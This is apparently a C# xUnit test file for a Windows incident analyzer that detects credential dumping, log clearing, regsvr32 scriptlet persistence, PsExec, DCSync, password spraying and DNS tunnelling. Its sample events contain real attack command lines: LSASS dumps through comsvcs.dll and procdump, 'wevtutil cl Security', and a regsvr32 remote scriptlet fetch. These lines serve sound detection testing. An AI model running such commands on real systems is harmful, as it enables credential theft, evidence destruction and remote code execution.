using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Options;
using WindowsIncidentAnalyzer;
using WindowsIncidentAnalyzer.Configuration;
using WindowsIncidentAnalyzer.Detectors;
using WindowsIncidentAnalyzer.Models;
using Xunit;

namespace WindowsIncidentAnalyzer.Tests.UnitTests;

public sealed class KnownThreatSignatureDetectorTests
{
    private static readonly IOptions<DetectionRulesOptions> Options =
        Microsoft.Extensions.Options.Options.Create(new DetectionRulesOptions
        {
            KnownThreatSignatures = new KnownThreatSignaturesOptions { Enabled = true }
        });

    [Fact]
    public void CredentialAccess_ComsvcsMiniDump_IsCritical()
    {
        var evt = ProcessEvent("rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 732 dump.bin full");
        var findings = new CredentialAccessDetector(Options).Analyze([evt]).ToList();

        Assert.Contains(findings, finding =>
            finding.Details?.Contains("CA-003", StringComparison.Ordinal) == true &&
            finding.Severity == DetectionSeverity.Critical);
    }

    [Fact]
    public void DefenseEvasion_RussianHostStillMatchesLanguageInvariantCommand()
    {
        var evt = ProcessEvent("wevtutil.exe", "wevtutil cl Security");
        evt.ComputerName = "РАБОЧАЯ-СТАНЦИЯ";
        var findings = new DefenseEvasionDetector(Options).Analyze([evt]).ToList();

        Assert.Contains(findings, finding => finding.Details?.Contains("DE-009", StringComparison.Ordinal) == true);
    }

    [Fact]
    public void Persistence_Regsvr32Scriptlet_IsCritical()
    {
        var evt = ProcessEvent("regsvr32.exe", "regsvr32 /s /n /u /i:https://example.invalid/a.sct scrobj.dll");
        var findings = new PersistenceAndLolbinDetector(Options).Analyze([evt]).ToList();

        Assert.Contains(findings, finding =>
            finding.Details?.Contains("PE-016", StringComparison.Ordinal) == true &&
            finding.Severity == DetectionSeverity.Critical);
    }

    [Fact]
    public void LateralMovement_PsExecService_IsCritical()
    {
        var evt = new WindowsEvent
        {
            EventId = 7045,
            ProviderName = "Service Control Manager",
            ServiceName = "PSEXESVC",
            CommandLine = @"C:\Windows\PSEXESVC.exe",
            TimeCreatedUtc = DateTime.UtcNow
        };
        var findings = new LateralMovementAndDiscoveryDetector(Options).Analyze([evt]).ToList();

        Assert.Contains(findings, finding =>
            finding.Details?.Contains("LM-001", StringComparison.Ordinal) == true &&
            finding.Severity == DetectionSeverity.Critical);
    }

    [Fact]
    public void SignatureWithWrongEventId_DoesNotMatch()
    {
        var evt = ProcessEvent("wevtutil.exe", "wevtutil cl Security");
        evt.EventId = 4624;
        var findings = new DefenseEvasionDetector(Options).Analyze([evt]).ToList();

        Assert.DoesNotContain(findings, finding => finding.Details?.Contains("DE-009", StringComparison.Ordinal) == true);
    }

    [Fact]
    public void DisabledCatalog_ProducesNoFindings()
    {
        var disabled = Microsoft.Extensions.Options.Options.Create(new DetectionRulesOptions
        {
            KnownThreatSignatures = new KnownThreatSignaturesOptions { Enabled = false }
        });
        var evt = ProcessEvent("procdump.exe", "procdump.exe -ma lsass.exe dump.dmp");

        Assert.Empty(new CredentialAccessDetector(disabled).Analyze([evt]));
    }

    [Fact]
    public void DependencyInjection_RegistersEveryDetector()
    {
        var configuration = new ConfigurationBuilder().AddInMemoryCollection().Build();
        using var provider = new ServiceCollection()
            .AddLogging()
            .AddApplicationServices(configuration)
            .BuildServiceProvider();

        var names = provider.GetServices<IDetectionRule>().Select(rule => rule.Name).ToHashSet();
        Assert.Equal(19, names.Count);
        Assert.Contains("CredentialAccess", names);
        Assert.Contains("DefenseEvasion", names);
        Assert.Contains("PersistenceAndLolbin", names);
        Assert.Contains("LateralMovementAndDiscovery", names);
        Assert.Contains("SecurityPolicyChange", names);
        Assert.Contains("MalwareBehavior", names);
        Assert.Contains("KerberosAndDirectoryAttack", names);
        Assert.Contains("SigmaRules", names);
    }

    [Fact]
    public void DirectoryReplicationGuid_IsDcsyncFinding()
    {
        var evt = new WindowsEvent
        {
            EventId = 4662,
            ProviderName = "Microsoft-Windows-Security-Auditing",
            User = "LAB\\operator",
            RawXml = "<Data Name=\"Properties\">%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}</Data>",
            TimeCreatedUtc = DateTime.UtcNow
        };

        var findings = new KerberosAndDirectoryAttackDetector(Options).Analyze([evt]).ToList();
        Assert.Contains(findings, finding =>
            finding.Details?.Contains("AD-001", StringComparison.Ordinal) == true &&
            finding.Severity == DetectionSeverity.Critical);
    }

    [Fact]
    public void PasswordSpray_AcrossDistinctAccounts_IsDetected()
    {
        var start = DateTime.UtcNow;
        var events = Enumerable.Range(1, 5)
            .Select(index => new WindowsEvent
            {
                EventId = 4625,
                TargetUserName = $"user{index}",
                SourceIpAddress = "10.0.0.77",
                TimeCreatedUtc = start.AddSeconds(index)
            })
            .ToList();

        var findings = new BruteForceDetector(Options).Analyze(events).ToList();
        Assert.Contains(findings, finding => finding.Title.Contains("password spraying", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void LongEncodedDnsLabel_IsDetected()
    {
        var evt = new WindowsEvent
        {
            EventId = 22,
            ProviderName = "Microsoft-Windows-Sysmon",
            QueryName = "mfrggzdfmztwq2lk".PadRight(58, '7') + ".example.test",
            TimeCreatedUtc = DateTime.UtcNow
        };

        var findings = new MalwareBehaviorDetector(Options).Analyze([evt]).ToList();
        Assert.Contains(findings, finding => finding.Details?.Contains("MB-017", StringComparison.Ordinal) == true);
    }

    private static WindowsEvent ProcessEvent(string process, string commandLine) =>
        new()
        {
            EventId = 4688,
            ProviderName = "Microsoft-Windows-Security-Auditing",
            ProcessName = process,
            ProcessPath = @"C:\Windows\System32\" + process,
            CommandLine = commandLine,
            TimeCreatedUtc = DateTime.UtcNow
        };
}
